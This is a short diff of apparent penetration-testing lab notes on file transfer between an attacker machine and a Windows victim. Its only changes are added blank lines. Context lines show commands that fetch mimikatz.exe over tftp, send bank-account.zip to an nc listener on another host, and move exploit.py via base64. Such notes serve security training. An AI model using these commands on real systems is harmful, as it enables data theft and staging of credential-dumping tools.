@@ -43,8 +43,10 @@ Using MSF. Start MSF before starting these steps:
   	4. tftp -i 10.10.10.10 GET mimikatz.exe
 
 #NC (Windows to Kali)
+
 	Windows:
 	1. nc -nv 10.11.0.61 4444 < bank-account.zip
+	
 	Linux:
 	2. nc -nlvp 4444 > bank-account.zip
 	
@@ -54,6 +56,7 @@ Using MSF. Start MSF before starting these steps:
 #Base64
 	local system:
 	1. cat exploit.py |base64
+	
 	victim:
 	2. echo "base64string==" | base64 -d >> exploit.py
 
